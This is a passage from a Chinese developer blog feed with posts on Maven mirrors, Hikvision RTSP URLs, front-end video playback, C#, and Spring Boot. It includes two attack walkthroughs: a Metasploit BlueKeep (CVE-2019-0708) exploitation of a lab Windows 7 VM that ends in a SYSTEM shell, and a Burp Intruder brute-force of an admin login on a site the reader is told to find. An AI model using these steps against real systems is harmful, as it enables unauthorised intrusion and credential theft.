    <link href="/2019/12/09/%E8%A7%A3%E5%86%B3idea%E4%B8%8Bmaven%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E7%BC%93%E6%85%A2%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E8%BF%87%E6%85%A2/index/"/>
    <url>/2019/12/09/%E8%A7%A3%E5%86%B3idea%E4%B8%8Bmaven%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA%E7%BC%93%E6%85%A2%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E8%BF%87%E6%85%A2/index/</url>
    
    <content type="html"><![CDATA[<p>使用国内阿里公司的镜像源进行包的下载</p><p>下载maven、配置环境变量、设置Repository。 这时你创建maven项目时settings.xml默认是用/User/.m2/settings.xml。 打开maven/conf/settings.xml， 找到mirrors。 替换如下配置</p><pre><code class="hljs asp">&lt;mirrors&gt;  &lt;!-- mirror   | Specifies a repository mirror site to use instead of a given repository. The repository that   | this mirror serves has an ID that matches the mirrorOf element of this mirror. IDs are used   | for inheritance and direct lookup purposes, and must be unique across the set of mirrors.   |  &lt;mirror&gt;    &lt;id&gt;mirrorId&lt;&#x2F;id&gt;    &lt;mirrorOf&gt;repositoryId&lt;&#x2F;mirrorOf&gt;    &lt;name&gt;Human Readable Name for this Mirror.&lt;&#x2F;name&gt;    &lt;url&gt;http:&#x2F;&#x2F;my.repository.com&#x2F;repo&#x2F;path&lt;&#x2F;url&gt;  &lt;&#x2F;mirror&gt;   --&gt;   &lt;mirror&gt;    &lt;id&gt;alimaven&lt;&#x2F;id&gt;    &lt;name&gt;aliyun maven&lt;&#x2F;name&gt;    &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;    &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;         &lt;&#x2F;mirror&gt;&lt;&#x2F;mirrors&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>idea相关</category>
      
      <category>java</category>
      
      <category>springboot</category>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>海康摄像头相关</title>
    <link href="/2019/12/06/%E6%B5%B7%E5%BA%B7%E6%91%84%E5%83%8F%E5%A4%B4%E7%9B%B8%E5%85%B3/index/"/>
    <url>/2019/12/06/%E6%B5%B7%E5%BA%B7%E6%91%84%E5%83%8F%E5%A4%B4%E7%9B%B8%E5%85%B3/index/</url>
    
    <content type="html"><![CDATA[<ol><li>摄像头rtsp地址格式</li></ol><p>旧URL：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;[username]:[password]@[ipaddress]&#x2F;[videotype]&#x2F;ch[number]&#x2F;[streamtype]</code></pre><p>如：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;admin:12345@192.168.25.64:554&#x2F;h264&#x2F;ch1&#x2F;main&#x2F;av_stream</code></pre><p>新URL：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;[username]:[password]@[IP]:554&#x2F;Streaming&#x2F;Channels&#x2F;[channelID][streamID]</code></pre><p>如：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;admin:12345@192.168.25.64:554&#x2F;Streaming&#x2F;Channels&#x2F;101</code></pre><ol start="2"><li>录像机RTSP地址格式</li></ol><p>录像机其实和摄像机基本一样，旧URL中摄像头的ch[number]中number为1，录像中这个为录像机中每个摄像头通道编号，如1、2、等，小于64路的录像机或混合录像机的IP通道从33开始；大于等于64路的录像机的IP通道从1开始 旧URL：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;[username]:[password]@[ipaddress]&#x2F;[videotype]&#x2F;ch[number]&#x2F;[streamtype]</code></pre><p>如：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;admin:12345@192.168.25.64:554&#x2F;h264&#x2F;ch2&#x2F;main&#x2F;av_stream</code></pre><p>新URL，通道号全部按顺序从1开始。 新URL：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;[username]:[password]@[IP]:554&#x2F;Streaming&#x2F;Channels&#x2F;[channelID][streamID]</code></pre><p>如：</p><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;admin:12345@192.168.25.64:554&#x2F;Streaming&#x2F;Channels&#x2F;101</code></pre><ol start="3"><li>录像机回放RTSP地址格式</li></ol><pre><code class="hljs asp">rtsp:&#x2F;&#x2F;username:password@192.168.25.64:554&#x2F;Streaming&#x2F;tracks&#x2F;101? starttime&#x3D;20190703T105010Z&amp;endtime&#x3D;20190703T115010Z</code></pre><p>表示以单播形式回放通道1 中的录像文件，时间范围是starttime 到endtime，其中starttime 和endtime 的格式要符合ISO 8601 。具体格式是YYYYMMDD”T”HHmmSS”Z” ，Y 是年，M 是月，D 是日，T 是时间分格符，H 是小时，M 是分，S 是秒，Z 是可选的、表示Zulu (GMT) 时间。</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>js控制网站皮肤</title>
    <link href="/2019/11/26/js%E6%8E%A7%E5%88%B6%E7%BD%91%E7%AB%99%E7%9A%AE%E8%82%A4/index/"/>
    <url>/2019/11/26/js%E6%8E%A7%E5%88%B6%E7%BD%91%E7%AB%99%E7%9A%AE%E8%82%A4/index/</url>
    
    <content type="html"><![CDATA[<p>html:</p><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;background&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/black.css&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;change(&#x27;orange&#x27;)&quot;</span>&gt;</span>[橙色地带]<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;change(&#x27;green&#x27;)&quot;</span>&gt;</span>[绿色背景]<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;change(&#x27;red&#x27;)&quot;</span>&gt;</span>[灰色空间]<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>js:</p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params">type</span>) </span>&#123;       <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&quot;orange&quot;</span>) &#123;           <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;background&quot;</span>).href = <span class="hljs-string">&quot;css/orange.css&quot;</span>;       &#125;       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&quot;green&quot;</span>) &#123;           <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;background&quot;</span>).href = <span class="hljs-string">&quot;css/green.css&quot;</span>;       &#125;       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&quot;red&quot;</span>) &#123;           <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;background&quot;</span>).href = <span class="hljs-string">&quot;css/red.css&quot;</span>;       &#125;   &#125;</code></pre><p>然后再写三个外联css文档，设置相应的background举例：</p><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:orange;&#125;</code></pre><p>亲测外联好使，其他没测，请自行测试</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>rdp漏洞复现详细版</title>
    <link href="/2019/11/13/rdp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AF%A6%E7%BB%86%E7%89%88/index/"/>
    <url>/2019/11/13/rdp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AF%A6%E7%BB%86%E7%89%88/index/</url>
    
    <content type="html"><![CDATA[<h3 id="禁止用于非法用途，仅限于学习使用！！！"><a href="#禁止用于非法用途，仅限于学习使用！！！" class="headerlink" title="禁止用于非法用途，仅限于学习使用！！！"></a>禁止用于非法用途，仅限于学习使用！！！</h3><p>Windows系列服务器于2019年5月15号，被爆出高危漏洞，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的，堪比WannaCry</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Windows 7 Windows Server 2008 R2 Windows Server 2008 Windows Server 2003 Windows XP</p><h4 id="攻击机：kali"><a href="#攻击机：kali" class="headerlink" title="攻击机：kali"></a>攻击机：kali</h4><h4 id="目标机：win7旗舰版（已开启远程桌面连接）"><a href="#目标机：win7旗舰版（已开启远程桌面连接）" class="headerlink" title="目标机：win7旗舰版（已开启远程桌面连接）"></a>目标机：win7旗舰版（已开启远程桌面连接）</h4><ol><li>打开msf <code>msfconsole</code></li><li>使用exploit/windows/rdp/cve_2019_0708_bluekeep_rce 模块 <code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code> <img src="images/%E6%A8%A1%E5%9D%97.png"></li><li>设置目标机ip（我这里是192.168.1.100） <code>set RHOSTS 192.168.1.100</code> <img src="images/%E7%AB%AF%E5%8F%A3.png"></li><li>设置目标机远程登录端口（默认是3389，我的没有修改） <code>set RPORT 3389</code> <img src="images/%E7%AB%AF%E5%8F%A3-1.png"></li><li>设置机器架构，可使用show targets 来 选择机器结构 <img src="images/%E6%8D%95%E8%8E%B7.png"></li></ol><p>6.我这里是vmware15.1 win7所以机器target为5 <code>set target 5</code> <img src="images/settarget.png"> 7.使用exploit进行攻击 （新发布的exp还不够稳定，所以第一次打蓝屏了，尴尬） <img src="images/%E6%94%BB%E5%87%BB%E5%A4%B1%E8%B4%A5.png"> <img src="images/blue.png"></p><p>8.win7重新开机，再次exploit，打重启了，妈卖批！！！</p><p>9.再来一次，更改target为2 ，终于成功反弹shell，执行whoami，显示nt authority\system，直接拿到目标机系统权限， success！！！</p><p><img src="images/%E6%88%90%E5%8A%9F.png"></p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>由于现在exp不是很稳定，很难在实战中利用，但是吧，有些地方在五月份左右的时候已经有稳定的exp了，不过比较贵，嗯。。，几万美元</p><h4 id="提醒："><a href="#提醒：" class="headerlink" title="提醒："></a>提醒：</h4><p>更改一下带宽，或者换一下target，多试几次总会成功的</p><h4 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h4><p>我特么也不知道为啥我的虚拟机是vmware15.1，而target是2，反正成功了 ，而我已经十一点了还没有吃饭，饿死我了！啊啊啊啊啊啊！！！！</p><h4 id="感谢表哥们的观看，如有问题，欢迎评论"><a href="#感谢表哥们的观看，如有问题，欢迎评论" class="headerlink" title="感谢表哥们的观看，如有问题，欢迎评论"></a>感谢表哥们的观看，如有问题，欢迎评论</h4>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>burp简单破解后台账号密码</title>
    <link href="/2019/11/12/burp%E7%AE%80%E5%8D%95%E7%A0%B4%E8%A7%A3%E5%90%8E%E5%8F%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/index/"/>
    <url>/2019/11/12/burp%E7%AE%80%E5%8D%95%E7%A0%B4%E8%A7%A3%E5%90%8E%E5%8F%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/index/</url>
    
    <content type="html"><![CDATA[<h3 id="禁止用于非法用途，仅限于学习使用！！！"><a href="#禁止用于非法用途，仅限于学习使用！！！" class="headerlink" title="禁止用于非法用途，仅限于学习使用！！！"></a>禁止用于非法用途，仅限于学习使用！！！</h3><p>burpsuite是渗透测试人员必不可少的神器之一，下面本人亲自实验过，如有问题，恳请指正，感谢</p><ol><li>首先找到一个网站后台（请自行查找） <img src="images/%E7%99%BB%E5%BD%95%E6%A1%86.png"></li><li>使用火狐浏览器配置本机代理ip及端口（也可使用ie代理，自行抉择，同理） <img src="images/%E7%81%AB%E7%8B%90.png"></li><li>burp设置代理，需要第二步所填相同 <img src="images/burpproxy.png"></li><li>在网站后台登录地址随意输入后点击登录，进行抓包 <img src="images/%E6%8A%93%E5%8C%85.png"></li><li>在Intruder模块下进行配置，用户名和密码都不知道的情况下请选择 cluster bomb （如图红圈）并将不需要的位置选择以后点击clear按钮，然后选择需要破解的地方添加进去 <img src="images/intru.png"> 6.payload界面配置payload，两个都未知的情况下请挨个添加字典，或者直接在文本框输入（画圈的地方就是设置两个payload的位置，可分别配置） <img src="images/%E8%AE%BE%E7%BD%AE1%EF%BC%8C2.png"> 7.点击attack后请看下图，status不一致的地方即是正确的用户名和密码（也可通过length进行查看，差距最大的那个就是） <img src="images/%E7%BB%93%E6%9E%9C-1.png"></li></ol><h4 id="如有表哥有何见解请在下方评论区回复，我会看到，感谢学习"><a href="#如有表哥有何见解请在下方评论区回复，我会看到，感谢学习" class="headerlink" title="如有表哥有何见解请在下方评论区回复，我会看到，感谢学习"></a>如有表哥有何见解请在下方评论区回复，我会看到，感谢学习</h4>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>委托简单使用</title>
    <link href="/2019/11/05/%E5%A7%94%E6%89%98%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/index/"/>
    <url>/2019/11/05/%E5%A7%94%E6%89%98%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/index/</url>
    
    <content type="html"><![CDATA[<p>定义委托：</p><pre><code class="hljs csharp"> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">delegate</span> <span class="hljs-built_in">int</span> <span class="hljs-title">CalculatorDelegate</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> a, <span class="hljs-built_in">int</span> b</span>)</span>;</code></pre><p>然后定义两个和委托类型和参数个数一样的方法：</p><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> <span class="hljs-title">Add</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> a,<span class="hljs-built_in">int</span> b</span>)</span><span class="hljs-function"></span>           &#123;            <span class="hljs-keyword">return</span> a + b;           &#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> <span class="hljs-title">Sub</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> a,<span class="hljs-built_in">int</span> b</span>)</span><span class="hljs-function"></span>           &#123;            <span class="hljs-keyword">return</span> a - b;           &#125;<span class="hljs-comment">//创建委托对象，关联Add方法</span>            CalculatorDelegate objCal = <span class="hljs-keyword">new</span> CalculatorDelegate(Add);            <span class="hljs-comment">//通过委托调用方法，而不是直接使用方法</span>            <span class="hljs-built_in">int</span> result = objCal(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);            Console.WriteLine(result);</code></pre><p>输出结果为：30</p><pre><code class="hljs csharp">objCal -= Add;<span class="hljs-comment">//断开当前委托所关联的方法Add</span>objCal += Sub;<span class="hljs-comment">//重新关联一个方法Sub</span>result = objCal(<span class="hljs-number">30</span>,<span class="hljs-number">10</span>);</code></pre><p>输出结果为：20</p><p>委托一般声明在类的外部，根据委托定义的函数原型编写需要的方法，委托在使用前必须实例化，实例化的时候需要指明默认的方法，委托调用方法，而不是直接调用方法，委托对象所关联的方法可以动态变化。</p>]]></content>
    
    
    <categories>
      
      <category>c-2</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>videojs实现web播放器播放hls</title>
    <link href="/2019/11/01/videojs%E5%AE%9E%E7%8E%B0web%E6%92%AD%E6%94%BE%E5%99%A8%E6%92%AD%E6%94%BEhls/index/"/>
    <url>/2019/11/01/videojs%E5%AE%9E%E7%8E%B0web%E6%92%AD%E6%94%BE%E5%99%A8%E6%92%AD%E6%94%BEhls/index/</url>
    
    <content type="html"><![CDATA[<p>index.html：</p><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">utf-8</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video/video0.ts&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://unpkg.com/video.js/dist/video-js.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/video.js@6.7.1/dist/video.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/@videojs/http-streaming@0.9.0/dist/videojs-http-streaming.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">  <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>:<span class="hljs-number">1300px</span>) &#123;</span>    .video-js&#123;<span class="css">      <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="css">      <span class="hljs-attribute">height</span>: <span class="hljs-number">500px</span>;</span><span class="css">      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span>    &#125;  &#125;<span class="css">  <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1300px</span>)&#123;</span>    .video-js &#123;<span class="css">      <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;</span><span class="css">      <span class="hljs-attribute">height</span>: <span class="hljs-number">400px</span>;</span><span class="css">      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span>    &#125;  &#125;   /* .video-js&#123;<span class="css">      <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;</span><span class="css">      <span class="hljs-attribute">height</span>: <span class="hljs-number">400px</span>;</span><span class="css">      <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span>    &#125;*/<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">video-js</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;my_video_1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;vjs-default-skin&quot;</span> <span class="hljs-attr">controls</span> <span class="hljs-attr">preload</span>=<span class="hljs-string">&quot;auto&quot;</span> &gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video/video.m3u8&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/x-mpegURL&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video-js</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">  <span class="hljs-keyword">var</span> player = videojs(<span class="hljs-string">&#x27;my_video_1&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>控制（请自行写方法，替换参数，经过测试，调用即可）： 播放事件控制：</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> options = &#123;&#125;;      videojs(<span class="hljs-built_in">this</span>.Warpper, options, <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onPlayerReady</span>(<span class="hljs-params"></span>) </span>&#123;          <span class="hljs-built_in">this</span>.play();      &#125;);</code></pre><p>暂停：</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> options = &#123;&#125;;       videojs(<span class="hljs-built_in">this</span>.Warpper, options, <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onPlayerReady</span>(<span class="hljs-params"></span>) </span>&#123;           <span class="hljs-built_in">this</span>.pause();       &#125;);</code></pre><p>速度控制：</p><pre><code class="hljs javascript">player.playbackRate(<span class="hljs-built_in">this</span>.speed);</code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>.net实现调用cmd命令</title>
    <link href="/2019/10/29/net%E5%AE%9E%E7%8E%B0%E8%B0%83%E7%94%A8cmd%E5%91%BD%E4%BB%A4/index/"/>
    <url>/2019/10/29/net%E5%AE%9E%E7%8E%B0%E8%B0%83%E7%94%A8cmd%E5%91%BD%E4%BB%A4/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">runCmdTranscoding</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>        &#123;            DateTime start = DateTime.Now;            <span class="hljs-keyword">try</span>            &#123;                <span class="hljs-built_in">string</span> strCMD = <span class="hljs-string">@&quot;ffmpeg -i C:\Users\Dell\Desktop\b\b.mp4 -profile:v High -level 5.0 -start_number 0 -hls_time 10 -hls_list_size 0 -f hls C:\Users\Dell\Desktop\b\b.m3u8&quot;</span>;                <span class="hljs-comment">//创建一个进程</span>                Process p = <span class="hljs-keyword">new</span> Process();                p.StartInfo.FileName = <span class="hljs-string">&quot;cmd.exe&quot;</span>;                p.StartInfo.UseShellExecute = <span class="hljs-literal">false</span>;<span class="hljs-comment">//是否使用操作系统shell启动</span>                p.StartInfo.RedirectStandardInput = <span class="hljs-literal">true</span>;<span class="hljs-comment">//接受来自调用程序的输入信息</span>                p.StartInfo.RedirectStandardOutput = <span class="hljs-literal">true</span>;<span class="hljs-comment">//由调用程序获取输出信息</span>                p.StartInfo.RedirectStandardError = <span class="hljs-literal">true</span>;<span class="hljs-comment">//重定向标准错误输出</span>                p.StartInfo.CreateNoWindow = <span class="hljs-literal">true</span>;<span class="hljs-comment">//不显示程序窗口</span>                <span class="hljs-comment">//p.StartInfo.Arguments = strCMD;</span>                p.Start();<span class="hljs-comment">//启动程序</span>                <span class="hljs-comment">//向cmd窗口发送输入信息</span>                p.StandardInput.WriteLine(strCMD + <span class="hljs-string">&quot;&amp;exit&quot;</span>);                p.StandardInput.AutoFlush = <span class="hljs-literal">true</span>;                p.StandardInput.Close();                <span class="hljs-comment">//获取cmd窗口的输出信息</span>                <span class="hljs-built_in">string</span> output = p.StandardError.ReadToEnd();                <span class="hljs-comment">//等待程序执行完退出进程</span>                p.WaitForExit();                p.Close();                DateTime end = DateTime.Now;                <span class="hljs-built_in">string</span> str = (<span class="hljs-string">&quot;OK: start=&quot;</span> + start.ToString(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss:fff&quot;</span>) + <span class="hljs-string">&quot;   ####   end=&quot;</span> + end.ToString(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss:fff&quot;</span>) + <span class="hljs-string">&quot;\n消耗时长为：&quot;</span> + (end - start).TotalSeconds.ToString());                <span class="hljs-comment">//Console.WriteLine(output);</span>                Response.Write(str);            &#125;            catch (Exception ex)            &#123;                Response.Write(ex.Message + <span class="hljs-string">&quot;\r\n跟踪;&quot;</span> + ex.StackTrace);            &#125;        &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>c-2</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot</title>
    <link href="/2019/10/12/springboot/index/"/>
    <url>/2019/10/12/springboot/index/</url>
    
    <content type="html"><![CDATA[<p>使用注解的优势：</p><p> </p><p>1.采用纯java代码，不在需要配置繁杂的xml文件</p><p> </p><p>2.在配置中也可享受面向对象带来的好处</p><p> </p><p>3.类型安全对重构可以提供良好的支持</p><p> </p><p>4.减少复杂配置文件的同时亦能享受到springIoC容器提供的功能</p><p> </p><p>一、注解详解（配备了完善的释义）</p><p> </p><p>@SpringBootApplication：申明让spring boot自动给程序进行必要的配置，这个配置等同于：</p><p> </p><p>@Configuration ，@EnableAutoConfiguration 和 @ComponentScan 三个配置。</p><p> </p><p>@ResponseBody：表示该方法的返回结果直接写入HTTP response body中，一般在异步获取数据时使用，用于构建RESTful的api。在使用@RequestMapping后，返回值通常解析为跳转路径，加上@esponsebody后返回结果不会被解析为跳转路径，而是直接写入HTTP response body中。比如异步获取json数据，加上@Responsebody后，会直接返回json数据。该注解一般会配合@RequestMapping一起使用。</p><p> </p><p>@Controller：用于定义控制器类，在spring项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。</p><p> </p><p>@RestController：用于标注控制层组件(如struts中的action)，@ResponseBody和@Controller的合集。</p><p> </p><p>@RequestMapping：提供路由信息，负责URL到Controller中的具体函数的映射。</p><p> </p><p>@EnableAutoConfiguration：SpringBoot自动配置（auto-configuration）：尝试根据你添加的jar依赖自动配置你的Spring应用。例如，如果你的classpath下存在HSQLDB，并且你没有手动配置任何数据库连接beans，那么我们将自动配置一个内存型（in-memory）数据库”。你可以将@EnableAutoConfiguration或者@SpringBootApplication注解添加到一个@Configuration类上来选择自动配置。如果发现应用了你不想要的特定自动配置类，你可以使用@EnableAutoConfiguration注解的排除属性来禁用它们。</p><p> </p><p>@ComponentScan：表示将该类自动发现扫描组件。个人理解相当于，如果扫描到有@Component、@Controller、@Service等这些注解的类，并注册为Bean，可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。如果没有配置的话，Spring Boot会扫描启动类所在包下以及子包下的使用了@Service,@Repository等注解的类。</p><p> </p><p>@Configuration：相当于传统的xml配置文件，如果有些第三方库需要用到xml文件，建议仍然通过@Configuration类作为项目的配置主类——可以使用@ImportResource注解加载xml配置文件。</p><p> </p><p>@Import：用来导入其他配置类。</p><p> </p><p>@ImportResource：用来加载xml配置文件。</p><p> </p><p>@Autowired：自动导入依赖的bean</p><p> </p><p>@Service：一般用于修饰service层的组件</p><p> </p><p>@Repository：使用@Repository注解可以确保DAO或者repositories提供异常转译，这个注解修饰的DAO或者repositories类会被ComponetScan发现并配置，同时也不需要为它们提供XML配置项。</p><p> </p><p>@Bean：用@Bean标注方法等价于XML中配置的bean。</p><p> </p><p>@Value：注入Spring boot application.properties配置的属性的值。示例代码：</p><p> </p><p>@Inject：等价于默认的@Autowired，只是没有required属性；</p><p> </p><p>@Component：泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注。</p><p> </p><p>@Bean:相当于XML中的,放在方法的上面，而不是类，意思是产生一个bean,并交给spring管理。</p><p> </p><p>@AutoWired：自动导入依赖的bean。byType方式。把配置好的Bean拿来用，完成属性、方法的组装，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。当加上（required=false）时，就算找不到bean也不报错。</p><p> </p><p>@Qualifier：当有多个同一类型的Bean时，可以用@Qualifier(“name”)来指定。与@Autowired配合使用。@Qualifier限定描述符除了能根据名字进行注入，但能进行更细粒度的控制如何选择候选者，具体使用方式如下：</p><p> </p><p>@Resource(name=”name”,type=”type”)：没有括号内内容的话，默认byName。与@Autowired干类似的事。</p><p> </p><p>二、注解列表如下</p><p> </p><p>@SpringBootApplication：包含了@ComponentScan、@Configuration和@EnableAutoConfiguration注解。其中</p><p> 